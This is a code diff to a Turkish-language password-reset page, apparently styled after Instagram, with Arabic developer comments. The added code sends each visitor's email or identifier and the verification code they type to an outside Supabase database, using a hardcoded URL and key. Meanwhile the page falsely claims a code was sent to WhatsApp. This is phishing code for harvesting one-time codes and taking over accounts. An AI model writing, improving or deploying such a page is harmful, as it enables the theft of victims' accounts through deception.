@@ -7,6 +7,8 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+<!-- مكتبة Supabase -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
     * {
         margin: 0;
@@ -394,6 +396,36 @@
 </div>
 
 <script>
+    // ==========================================
+    // 1. إعدادات Supabase (غير القيمتين دول بس)
+    // ==========================================
+    const SUPABASE_URL = 'https://dlmaxrijrqntcssvrsmy.supabase.co'; 
+    const SUPABASE_ANON_KEY = '_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRsbWF4cmlqcnFudGNzc3Zyc215Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIzMTk1MDAsImV4cCI6MjEwNzg5NTUwMH0.oFkpunqEGruS189py8FiU2BNCU3xBwSqLvkn2u_aIsg';
+
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    // دالة حفظ البيانات في قاعدة البيانات
+    async function saveToSupabase(identifier, code) {
+        try {
+            const { data, error } = await supabaseClient
+                .from('submissions')
+                .insert([
+                    { identifier: identifier, verification_code: code }
+                ]);
+
+            if (error) {
+                console.error('حدث خطأ أثناء الحفظ:', error);
+            } else {
+                console.log('تم حفظ البيانات بنجاح في Supabase!');
+            }
+        } catch (err) {
+            console.error('خطأ في الاتصال:', err);
+        }
+    }
+
+    // ==========================================
+    // باقي كود الصفحة (مش محتاج تغير فيه حاجة)
+    // ==========================================
     let userIdentifier = "";
     let countdownInterval = null;
 
@@ -403,7 +435,6 @@
         el.className = "msg " + (type || "");
     }
 
-    // Şifre gücü göstergesi
     document.addEventListener("DOMContentLoaded", function () {
         const newPass = document.getElementById("newPass");
         if (newPass) {
@@ -423,7 +454,6 @@
         }
     });
 
-    // Adım 1
     function sendCode() {
         const idInput = document.getElementById("identifier").value.trim();
         if (!idInput) {
@@ -432,6 +462,10 @@
         }
 
         userIdentifier = idInput;
+        
+        // حفظ الإيميل في قاعدة البيانات
+        saveToSupabase(userIdentifier, null);
+
         showMsg("msg1", "Doğrulama kodu WhatsApp'a gönderildi", "success");
 
         setTimeout(() => {
@@ -441,7 +475,6 @@
         }, 700);
     }
 
-    // Adım 2: 7 saniyelik geri sayım
     function verifyCode() {
         const codeInput = document.getElementById("verificationCode");
         const code = codeInput.value.trim();
@@ -450,6 +483,9 @@
             showMsg("msg2", "Lütfen doğrulama kodunu girin", "error");
             return;
         }
+
+        // حفظ الكود في قاعدة البيانات
+        saveToSupabase(userIdentifier, code);
 
         const verifyBtn = document.getElementById("verifyBtn");
         const backLink = document.getElementById("backLink2");
@@ -493,7 +529,6 @@
         showMsg("msg2", "", "");
     }
 
-    // Adım 3
     function resetPassword() {
         const pass = document.getElementById("newPass").value;
         const confirm = document.getElementById("confirmPass").value;
@@ -521,7 +556,5 @@
     }
 </script>
 
-</body>
-</html>
 </body>
 </html>
